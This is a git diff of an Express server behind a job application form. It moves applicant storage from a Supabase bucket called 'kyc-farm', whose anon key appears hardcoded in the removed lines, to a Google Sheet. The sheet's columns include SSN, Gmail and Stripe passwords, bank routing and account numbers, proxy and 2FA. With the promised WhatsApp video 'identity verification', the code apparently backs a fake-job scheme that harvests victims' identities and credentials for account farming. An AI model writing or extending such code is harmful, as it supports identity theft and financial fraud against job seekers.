@@ -1,18 +1,76 @@
+require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
 const multer = require('multer');
-const { createClient } = require('@supabase/supabase-js');
+const { google } = require('googleapis');
+const fs = require('fs');
 
 const app = express();
-const PORT = process.env.PORT || 8000;
+const PORT = process.env.PORT || 8080;
 
-// Supabase configuration
-const supabaseUrl = process.env.SUPABASE_URL || 'https://xduxzptxhvvlmiwxqhxz.supabase.co';
-const supabaseKey = process.env.SUPABASE_ANON_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhkdXh6cHR4aHZ2bG1pd3hxaHh6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA3NzM1MDQsImV4cCI6MjA2NjM0OTUwNH0.nEPp5-ke8-aCNJPuCcSI8S319s7_QZxKgEPb2jkHt20';
-const supabase = createClient(supabaseUrl, supabaseKey);
+// Google Sheets configuration
+const GOOGLE_SHEET_ID = process.env.GOOGLE_SHEET_ID;
+const CREDENTIALS_PATH = path.join(__dirname, 'credentials', 'google-service-account.json');
+
+// Initialize Google Sheets API
+let sheets;
+try {
+  if (fs.existsSync(CREDENTIALS_PATH)) {
+    const credentials = JSON.parse(fs.readFileSync(CREDENTIALS_PATH));
+    const auth = new google.auth.GoogleAuth({
+      credentials,
+      scopes: ['https://www.googleapis.com/auth/spreadsheets']
+    });
+    sheets = google.sheets({ version: 'v4', auth });
+    console.log('✅ Google Sheets API initialized successfully');
+  } else {
+    console.log('⚠️ Google service account credentials not found at:', CREDENTIALS_PATH);
+  }
+} catch (error) {
+  console.error('❌ Failed to initialize Google Sheets API:', error.message);
+}
 
 
+
+// Google Sheets helper function
+async function saveToGoogleSheets(leadData) {
+  if (!sheets || !GOOGLE_SHEET_ID) {
+    throw new Error('Google Sheets not configured');
+  }
+
+  // Map to your existing column structure:
+  // A: FULL NAME, B: STRIPE, C: STRIPE PASS., D: EMAIL, E: PHONE, F: WHATSAPP, 
+  // G: ADDRESS, H: DATE OF BIRTH, I: SSN, J: GMAIL, K: GMAIL PASS., L: ROUTING #, 
+  // M: ACC #, N: APPLICATION ID, O: SUBMISSION DATE, P: STATUS, Q: PROXY, R: 2FA
+  const values = [[
+    leadData.fullName,     // A: FULL NAME
+    '',                    // B: STRIPE (empty)
+    '',                    // C: STRIPE PASS. (empty)
+    leadData.email,        // D: EMAIL
+    leadData.phone,        // E: PHONE
+    leadData.whatsapp,     // F: WHATSAPP
+    leadData.address,      // G: ADDRESS
+    '',                    // H: DATE OF BIRTH (empty)
+    '',                    // I: SSN (empty)
+    '',                    // J: GMAIL (empty)
+    '',                    // K: GMAIL PASS. (empty)
+    '',                    // L: ROUTING # (empty)
+    '',                    // M: ACC # (empty)
+    leadData.applicationId, // N: APPLICATION ID
+    new Date().toISOString(), // O: SUBMISSION DATE
+    'New Lead',            // P: STATUS
+    '',                    // Q: PROXY (empty)
+    ''                     // R: 2FA (empty)
+  ]];
+
+  await sheets.spreadsheets.values.append({
+    spreadsheetId: GOOGLE_SHEET_ID,
+    range: 'A:R',
+    valueInputOption: 'RAW',
+    resource: { values }
+  });
+}
 
 // Configure multer for form data handling
 const upload = multer();
@@ -40,7 +98,7 @@ app.get('/health', (req, res) => {
       environment: process.env.NODE_ENV || 'development',
       port: PORT,
       uptime: process.uptime(),
-      supabaseConfigured: !!(process.env.SUPABASE_URL && process.env.SUPABASE_ANON_KEY)
+      googleSheetsConfigured: !!(sheets && GOOGLE_SHEET_ID)
     });
   } catch (error) {
     console.error('Health check failed:', error);
@@ -55,126 +113,39 @@ app.get('/health', (req, res) => {
 // Application submission endpoint
 app.post('/api/submit-application', upload.none(), async (req, res) => {
   try {
-    console.log('=== REQUEST DEBUG INFO ===');
-    console.log('Content-Type:', req.headers['content-type']);
-    console.log('req.body keys:', Object.keys(req.body));
-    console.log('req.body:', req.body);
-    console.log('========================');
-    
     const { 
-      email, 
-      firstName, 
-      lastName, 
-      phone, 
-      whatsapp, 
-      street, 
-      city, 
-      state, 
-      zipCode, 
-      country, 
-      experience, 
-      schedule 
+      email, firstName, lastName, phone, whatsapp, 
+      street, city, state, zipCode, country 
     } = req.body;
     
-    // Create folder name
     const fullName = `${firstName} ${lastName}`;
-    const safeFolderName = fullName
-      .replace(/[^a-zA-Z0-9\s]/g, '') // Remove special characters
-      .replace(/\s+/g, '-') // Replace spaces with hyphens
-      .toLowerCase();
+    const address = `${street}, ${city}, ${state} ${zipCode}, ${country}`;
+    const applicationId = 'APP-' + Date.now();
     
-    const timestamp = new Date().toISOString().slice(0, 10); // YYYY-MM-DD
-    const folderName = `${timestamp}_${safeFolderName}`;
+    // Save to Google Sheets
+    await saveToGoogleSheets({
+      fullName,
+      email,
+      phone,
+      whatsapp,
+      address,
+      applicationId
+    });
     
-    // Create application info
-    const applicationInfo = {
-      timestamp: new Date().toISOString(),
-      applicantName: `${firstName} ${lastName}`,
-      email: email,
-      phone: phone,
-      whatsapp: whatsapp,
-      address: {
-        street: street,
-        city: city,
-        state: state,
-        zipCode: zipCode,
-        country: country,
-        full: `${street}, ${city}, ${state} ${zipCode}, ${country}`
-      },
-      experience: experience,
-      schedule: schedule,
-      applicationId: 'APP-' + Date.now(),
-      folderName: folderName,
-      status: 'Pending WhatsApp Contact'
-    };
-    
-    // Save application info to Supabase Storage as text file
-    const infoText = `CUSTOMER SERVICE APPLICATION
-========================================
-
-Applicant Information:
-- Full Name: ${applicationInfo.applicantName}
-- Email: ${applicationInfo.email}
-- Phone: ${applicationInfo.phone}
-- WhatsApp: ${applicationInfo.whatsapp}
-- Address: ${applicationInfo.address.full}
-- Experience Level: ${applicationInfo.experience}
-- Preferred Schedule: ${applicationInfo.schedule}
-
-Application Details:
-- Application ID: ${applicationInfo.applicationId}
-- Submission Date: ${applicationInfo.timestamp}
-- Folder: ${folderName}
-
-Next Steps:
-- Representative will contact via WhatsApp within 48-72 hours
-- Identity verification will be conducted via WhatsApp video call
-- Interview will be scheduled after successful verification
-- Hiring and onboarding process will begin if all goes well
-
-Status: ${applicationInfo.status}
-========================================`;
-
-    // Upload application info to Supabase
-    const infoBuffer = Buffer.from(infoText, 'utf8');
-    const infoFilePath = `applications/${folderName}/application-info.txt`;
-    
-    const { data: infoUpload, error: infoError } = await supabase.storage
-      .from('kyc-farm')
-      .upload(infoFilePath, infoBuffer, {
-        contentType: 'text/plain',
-        upsert: false
-      });
-
-    if (infoError) {
-      console.error('Failed to upload application info:', infoError);
-      console.error('⚠️  SUPABASE SETUP REQUIRED: Please ensure the kyc-farm bucket allows public uploads');
-      console.error('   Go to Supabase Dashboard > Storage > kyc-farm bucket > Settings > Make bucket public');
-    }
-
-    // Get public URL for application info
-    const { data: { publicUrl: infoUrl } } = supabase.storage
-      .from('kyc-farm')
-      .getPublicUrl(infoFilePath);
-    
-    console.log('=== New Application Received ===');
-    console.log('Applicant:', applicationInfo.applicantName);
-    console.log('Folder Created:', folderName);
+    console.log('=== New Lead Saved to Google Sheets ===');
+    console.log('Name:', fullName);
     console.log('Email:', email);
     console.log('Phone:', phone);
     console.log('WhatsApp:', whatsapp);
-    console.log('Address:', applicationInfo.address.full);
-    console.log('- Application Info:', infoUrl);
-    console.log('================================');
+    console.log('Address:', address);
+    console.log('=====================================');
     
-    // Simulate processing time
     setTimeout(() => {
       res.json({ 
         success: true, 
         message: 'Application submitted successfully! A representative will contact you via WhatsApp within 48-72 hours.',
-        applicationId: applicationInfo.applicationId,
-        applicantFolder: folderName,
-        infoUrl: infoUrl,
+        applicationId,
+        applicantFolder: `${new Date().toISOString().slice(0, 10)}_${fullName.toLowerCase().replace(/\s+/g, '-')}`,
         nextSteps: [
           'Keep your WhatsApp active and ready to receive messages',
           'A representative will contact you within 48-72 hours',
